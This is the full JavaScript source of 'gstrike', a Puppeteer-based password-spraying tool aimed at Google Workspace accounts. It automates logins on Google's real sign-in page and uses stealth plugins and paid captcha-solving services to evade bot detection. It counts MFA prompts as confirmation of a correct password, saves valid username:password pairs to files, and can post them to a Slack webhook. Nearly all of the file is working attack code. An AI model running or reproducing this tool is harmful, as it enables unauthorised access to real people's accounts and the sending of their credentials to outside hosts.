const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const RecaptchaPlugin = require("puppeteer-extra-plugin-recaptcha");
const commander = require("commander");
const fs = require("fs");
const { IncomingWebhook } = require("@slack/webhook");
const chalk = require("chalk");
const sleep = require("sleep-promise");
const path = require("path");
const Client = require("@infosimples/node_two_captcha");
require("log-timestamp");

commander
    .name("gstrike")
    .description(
        "A password spraying tool designed specifically for performing " +
            "\ntargeted password attacks against Google Workspace accounts"
    )
    .version("0.1.1")
    .option("-u, --usernames <file>", "Path to the usernames file")
    .option("-p, --passwords <file>", "Path to the passwords file")
    .option(
        "-w, --wait-time <ms>",
        "Minimum time to wait for page to load in milliseconds",
        1000,
        parseInt
    )
    .option(
        "-i, --interval <ms>",
        "Interval between login attempts in milliseconds",
        0,
        parseInt
    )
    .option("-H, --headless", "Run in headless mode", false)
    .option("-k, --api-key <key>", "2Captcha API key")
    .option("-s, --slack-webhook <url>", "Slack webhook URL")
    .option(
        "-o, --output <outputFile>",
        "Specify the output file name",
        "valid_creds.txt"
    )
    .option(
        "--test",
        "Test bot detection and take screenshot of the results",
        false
    )
    .option(
        "--demo",
        "Run in demo mode (do not output passwords to the screen)",
        false
    )
    .option(
        "--typing-delay <ms>",
        "Delay for typing in milliseconds",
        100,
        parseInt
    )
    .option(
        "-S, --screenshot",
        "Take screenshot on successful login or on unexpected behaviour",
        false
    )
    .option(
        "-d, --directory <dir>",
        "Directory to save screenshots when using -S",
        "screenshots"
    )
    .parse();

const options = commander.opts();
// Validate options
if (!options.test && (!options.usernames || !options.passwords)) {
    console.error(chalk.red("Usernames file and passwords file are required!"));
    process.exit(1);
}
// Remove trailing slashes from path
options.directory = path.normalize(options.directory);

// Check if directory exists and create it if it doesn't
if (!fs.existsSync(options.directory)) {
    fs.mkdirSync(options.directory);
    console.log(
        chalk.cyan("Directory", chalk.underline(options.directory), "created.")
    );
}

let client2captcha = null;

// Initialize 2Captcha client if API key was provided
if (options.apiKey) {
    client2captcha = new Client(options.apiKey, {
        timeout: 60000,
        polling: 5000,
        throwErrors: false,
    });
}

// Validate 2Captcha API key
// if (!commander.apiKey) {
//   console.error("2Captcha API key is required!");
//   process.exit(1);
// }

async function waitForDelayAndSelector(page, delay, selector) {
    if (delay) {
        await page.waitForTimeout(delay);
    }
    return await page.waitForSelector(selector);
}

async function isRecaptchaActivated(page) {
    const recaptchaSelector = "#captchaimg";
    const recaptchaElement = await page.$(recaptchaSelector);
    return recaptchaElement !== null;
}

async function checkLoginSuccess(page) {
    // Check if the login was successful
    return page.url().includes("inbox");
}

async function checkMFA(page) {
    // Check if MFA has been triggered, which means correct password
    if (
        page.url().includes("/challenge/dp?") ||
        page.url().includes("/challenge/totp?") ||
        page.url().includes("/challenge/ootp?") ||
        page.url().includes("/challenge/bc?") ||
        page.url().includes("/challenge/ipp?") ||
        page.url().includes("/challenge/sk/webauthn?") ||
        page.url().includes("/challenge/selection?")
    ) {
        return true;
    }
    // page asking for user to provide more verification methods
    if (page.url().includes("https://gds.google.com/web/chip?")) {
        return true;
    }
    return false;
}

async function removeFromArray(arr, element) {
    const index = arr.indexOf(element);
    if (index !== -1) {
        arr.splice(index, 1);
    }
}

async function sendSlackWebhook(webhookUrl, username, password, mfa) {
    try {
        const msg = mfa
            ? `Login Success!\nUsername: ${username}\nPassword: ${password} (MFA is active)`
            : `Login Success!\nUsername: ${username}\nPassword: ${password}`;
        const payload = {
            text: msg,
        };
        // Initialize with defaults
        const webhook = new IncomingWebhook(webhookUrl, {
            icon_emoji: ":bomb:",
        });
        // Send the notification
        (async () => {
            await webhook.send(payload);
        })();
    } catch (error) {
        console.error(
            chalk.red("Failed to send message to Slack webhook:"),
            error
        );
    }
}

async function decodeEntities(encodedString) {
    const translate_re = /&(nbsp|amp|quot|lt|gt);/g;
    const translate = {
        nbsp: " ",
        amp: "&",
        quot: '"',
        lt: "<",
        gt: ">",
    };
    return encodedString
        .replace(translate_re, function (match, entity) {
            return translate[entity];
        })
        .replace(/&#(\d+);/gi, function (match, numStr) {
            const num = parseInt(numStr, 10);
            return String.fromCharCode(num);
        });
}

async function solveRecaptchaManually(page) {
    console.warn(chalk.yellow("Captcha need to be solved manually!"));
    const readline = require("readline/promises");
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });
    //   await page.maximize();

    const answer = await rl.question("Press ENTER after solving captcha: ");

    //   await page.minimize();
}

// Query selector that includes text
async function querySelectorIncludesText(selector, regex) {
    return Array.from(document.querySelectorAll(selector)).find((el) =>
        el.textContent.match(regex)
    );
}

// main code
(async () => {
    // Load the stealth plugin
    puppeteer.use(StealthPlugin());

    // Load the recaptcha plugin
    const recaptchaPlugin = RecaptchaPlugin({
        provider: { id: "2captcha", token: options.apiKey },
        visualFeedback: true,
    });
    puppeteer.use(recaptchaPlugin);

    // Load the minmax plugin
    puppeteer.use(require("puppeteer-extra-plugin-minmax")());

    if (options.headless) {
        options.headless = "new";
    }
    const browserOptions = {
        args: ["--no-sandbox"],
        headless: options.headless,
        defaultViewport: null,
    };

    const browser = await puppeteer.launch(browserOptions);

    try {
        if (options.test) {
            console.log("Running tests...");
            const page = await browser.newPage();
            await page.setDefaultTimeout(15000);
            await page.goto("https://bot.sannysoft.com");
            await page.waitForTimeout(5000);
            await page.screenshot({ path: "testresult.png", fullPage: true });
            await browser.close();
            console.log(`All done, check the screenshot. ✨`);
            process.exit(0);
        }

        // Read usernames and passwords from files
        const usernames = fs
            .readFileSync(options.usernames, "utf8")
            .split("\n");
        const passwords = fs
            .readFileSync(options.passwords, "utf8")
            .split("\n");

        for (const password of passwords) {
            if (password === null || password === "") {
                continue;
            }
            if (options.demo) {
                console.log("[+] Spraying password **************");
            } else {
                console.log("[+] Spraying password ", password);
            }
            for (const username of usernames) {
                if (username === null || username === "") {
                    continue;
                }

                const page = await browser.newPage();
                tryuserlabel: try {
                    // Initialize object to control usage of anti-captcha service
                    const statsSvc = {
                        used: false,
                        id: "",
                        text: "",
                        success: false,
                    };

                    console.log(`Current username: ${username}`);

                    await page.goto(
                        "https://accounts.google.com/AccountChooser/signinchooser?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&ec=asw-gmail-globalnav-signin"
                    );

                    // Wait for the page to load
                    // this will throw if selector is not found
                    const emailSelector = await waitForDelayAndSelector(
                        page,
                        options.waitTime,
                        'input[type="email"]'
                    );

                    // Type into username box
                    await emailSelector.type(username, {
                        delay: options.typingDelay,
                    });
                    await page.keyboard.press("Enter");

                    await page.waitForTimeout(1000);

                    // Check if reCAPTCHA is present
                    // First, try captcha image
                    let foundCaptcha = false;
                    try {
                        const captchaimgSelector = await page.waitForSelector(
                            "#captchaimg",
                            {
                                visible: true,
                            }
                        );
                        if (captchaimgSelector) {
                            const valueHandle =
                                await captchaimgSelector.getProperty("src");
                            const rawValue = await decodeEntities(
                                await valueHandle.jsonValue()
                            );
                            console.warn(
                                chalk.yellow(`Found captchaimg element!`)
                            );
                            // Solve using 2captcha service
                            if (options.apiKey) {
                                try {
                                    const captchaRespSelector =
                                        await page.waitForSelector(
                                            'input[aria-label="Type the text you hear or see"]'
                                        );

                                    await client2captcha
                                        .decode({
                                            url: rawValue,
                                        })
                                        .then(function (response) {
                                            statsSvc.used = true;
                                            statsSvc.id = response.id;
                                            statsSvc.text = response.text;
                                            console.log(
                                                chalk.cyan(
                                                    "Captcha decoded automatically with text:",
                                                    chalk.bold(response.text)
                                                )
                                            );
                                        });
                                    await captchaRespSelector.type(
                                        statsSvc.text,
                                        {
                                            delay: options.typingDelay,
                                        }
                                    );
                                    await page.keyboard.press("Enter");
                                } catch (error) {
                                    console.warn(
                                        chalk.red(
                                            "Error during captcha handling:",
                                            error
                                        )
                                    );
                                    await solveRecaptchaManually(page);
                                }
                            } else {
                                // Solve captcha manually
                                await solveRecaptchaManually(page);
                            }
                            foundCaptcha = true;
                        }
                    } catch {
                        // In case of error because captchaimg not found, do nothing!
                    }

                    // Try to find other types of captchas
                    if (!foundCaptcha) {
                        let { captchas, filtered, error } =
                            await page.findRecaptchas();
                        if (error) {
                            console.error(
                                chalk.red(
                                    `Error on captcha detection: ${error}`
                                )
                            );
                        }
                        if (filtered.length > 0) {
                            console.debug(
                                `Found ${filtered.length} filtered captchas`
                            );
                            for (const filt of filtered) {
                                console.debug(
                                    `Captcha id: ${filt.id} - Filtered reason: ${filt.filteredReason}`
                                );
                            }
                        }
                        if (captchas.length > 0) {
                            console.debug(`Found ${captchas.length} captchas`);
                            for (const captcha of captchas) {
                                console.debug(`Captcha URL: ${captcha.url}`);
                            }
                            if (options.apiKey) {
                                // Solve using 2captcha service
                                await page.solveRecaptchas();
                                // TODO: perform some action after solving recaptcha
                                // HACK: pause to "solve" manually until automation is complete
                                await solveRecaptchaManually(page);
                            } else {
                                // Solve captcha manually
                                await solveRecaptchaManually(page);
                            }
                            foundCaptcha = true;
                        }
                    }

                    try {
                        await page.waitForNavigation();
                    } catch {}

                    // Check if username is wrong
                    try {
                        const result = await page.evaluate(() => {
                            const elements = Array.from(
                                document.querySelectorAll("span")
                            ).find((el) =>
                                el.textContent.match(
                                    /Couldn.t find your Google Account/
                                )
                            );
                            console.log(elements);

                            if (elements) {
                                const computedStyle =
                                    getComputedStyle(elements);
                                return (
                                    computedStyle.display !== "none" &&
                                    computedStyle.visibility !== "hidden"
                                );
                            }

                            return false;
                        });
                        if (result) {
                            console.debug(
                                "Couldn't find account! Removing from list..."
                            );
                            // Remove username from array
                            await removeFromArray(usernames, username);
                            break tryuserlabel;
                        }
                    } catch (error) {
                        console.error(
                            chalk.red(
                                "Error when checking for account: ",
                                error
                            )
                        );
                    }

                    try {
                        await page.waitForNavigation();
                    } catch {}

                    // If anti-captcha service was used, check if solution was correct
                    // Message on error: Please re-enter the characters you see in the image above
                    if (statsSvc.used) {
                        try {
                            const result = await page.evaluate(() => {
                                const elements = Array.from(
                                    document.querySelectorAll("div")
                                ).find((el) =>
                                    el.textContent.match(
                                        /Please re-enter the characters you see in the image above/
                                    )
                                );
                                console.log(elements);

                                if (elements) {
                                    const computedStyle =
                                        getComputedStyle(elements);
                                    return (
                                        computedStyle.display !== "none" &&
                                        computedStyle.visibility !== "hidden"
                                    );
                                }

                                return false;
                            });
                            if (result) {
                                console.debug(
                                    "Captcha solution was incorrect!"
                                );
                                await client2captcha
                                    .report(statsSvc.id)
                                    .then(function (response) {
                                        if (response) {
                                            console.log(
                                                `Captcha solution with id ${statsSvc.id} was reported as`,
                                                chalk.red("incorrect")
                                            );
                                        } else {
                                            console.log(
                                                `Error while reporting captcha solution with id ${statsSvc.id} as`,
                                                chalk.red("incorrect")
                                            );
                                        }
                                    });
                                break tryuserlabel;
                            }
                        } catch (error) {
                            console.error(
                                chalk.red(
                                    "Error when checking for captcha solution: ",
                                    error
                                )
                            );
                        }
                    }

                    // Search and type into password box
                    try {
                        const passwordSelector = await waitForDelayAndSelector(
                            page,
                            options.waitTime,
                            'input[type="password"]'
                        );
                        // If anti-captcha service was used, report correct solution
                        if (statsSvc.used) {
                            await client2captcha
                                .report(statsSvc.id, false)
                                .then(function (response) {
                                    console.debug(
                                        `Captcha solution with id ${statsSvc.id} was reported as`,
                                        chalk.blue("correct")
                                    );
                                });
                        }
                        await passwordSelector.type(password, { delay: 100 });
                        await page.keyboard.press("Enter");
                    } catch (error) {
                        console.error(
                            chalk.red("Could not find password field")
                        );
                        // If anti-captcha service was used, report incorrect solution
                        if (statsSvc.used) {
                            await client2captcha
                                .report(statsSvc.id)
                                .then(function (response) {
                                    if (response) {
                                        console.log(
                                            `Captcha solution with id ${statsSvc.id} was reported as`,
                                            chalk.red("incorrect")
                                        );
                                    } else {
                                        console.log(
                                            `Error while reporting captcha solution with id ${statsSvc.id} as`,
                                            chalk.red("incorrect")
                                        );
                                    }
                                });
                        }
                        break tryuserlabel;
                    }

                    try {
                        await page.waitForNavigation();
                    } catch {}
                    //   await page.waitForTimeout(2000);

                    // Check if password is wrong
                    // Find an element by its content using page.evaluate()
                    const element_wrong = await page.evaluate(() => {
                        const targetText = "Wrong password";
                        const elements = Array.from(
                            document.querySelectorAll("span")
                        );
                        return elements.find((el) =>
                            el.textContent.includes(targetText)
                        );
                    });

                    if (element_wrong) {
                        console.debug("Wrong password!");
                        break tryuserlabel;
                    }

                    // Check if it is an older password
                    const element_older = await page.evaluate(() => {
                        const targetText = "Your password was changed";
                        const elements = Array.from(
                            document.querySelectorAll("span")
                        );
                        return elements.find((el) =>
                            el.textContent.includes(targetText)
                        );
                    });

                    if (element_older) {
                        console.debug(chalk.cyan("Found an older password!"));
                        fs.appendFileSync(
                            "older_passwords.txt",
                            `${username}:${password}\n`
                        );
                        break tryuserlabel;
                    }

                    // Check if login was successful
                    const isLoginSuccessful = await checkLoginSuccess(page);
                    const isMfaTriggered = await checkMFA(page);
                    if (isLoginSuccessful || isMfaTriggered) {
                        if (isMfaTriggered) {
                            fs.appendFileSync(
                                options.output,
                                `${username}:${password} (MFA)\n`
                            );
                        } else {
                            fs.appendFileSync(
                                options.output,
                                `${username}:${password}\n`
                            );
                        }
                        await removeFromArray(usernames, username);

                        // Log to stdout
                        if (options.demo) {
                            const msg = isMfaTriggered
                                ? `[+] Found valid credentials -> ${username}:********** (MFA is active)`
                                : `[+] Found valid credentials -> ${username}:**********`;
                            console.log(chalk.green(msg));
                        } else {
                            const msg = isMfaTriggered
                                ? `[+] Found valid credentials -> ${username}:${password} (MFA is active)`
                                : `[+] Found valid credentials -> ${username}:${password}`;
                            console.log(chalk.green(msg));
                        }

                        // Take screenshot if option is enabled
                        if (options.screenshot) {
                            const encodedCred = Buffer.from(
                                `${username}:${password}`
                            ).toString("base64url");
                            const scr_path = isMfaTriggered
                                ? path.join(
                                      options.directory,
                                      `mfa_${encodedCred}.png`
                                  )
                                : path.join(
                                      options.directory,
                                      `success_${encodedCred}.png`
                                  );
                            try {
                                await page.screenshot({
                                    path: scr_path,
                                    fullPage: true,
                                });
                                console.log(
                                    chalk.blue("Screenshot saved to ", scr_path)
                                );
                            } catch {
                                console.error(
                                    chalk.red(
                                        "Could not save screenshot to ",
                                        scr_path
                                    )
                                );
                            }
                        }

                        // Send Slack webhook with username and password
                        if (options.slackWebhook) {
                            // In case of error, it will just log a message
                            await sendSlackWebhook(
                                options.slackWebhook,
                                username,
                                password,
                                isMfaTriggered
                            );
                        }
                    }
                } catch (error) {
                    fs.appendFileSync(
                        "incomplete_reqs.txt",
                        `${username}:${password}\n`
                    );
                    console.error(chalk.red(`An error occurred: ${error}`));
                } finally {
                    // clear browsing data
                    const client = await page.target().createCDPSession();
                    await client.send("Network.clearBrowserCookies");
                    await client.send("Network.clearBrowserCache");
                    // always close page
                    await page.close();
                    await sleep(options.interval);
                }
            }
        }
        // await browser.close();
    } catch (error) {
        console.error(chalk.red(`An error occurred: ${error}`));
    } finally {
        await browser.close();
        process.exit(0);
    }
})();
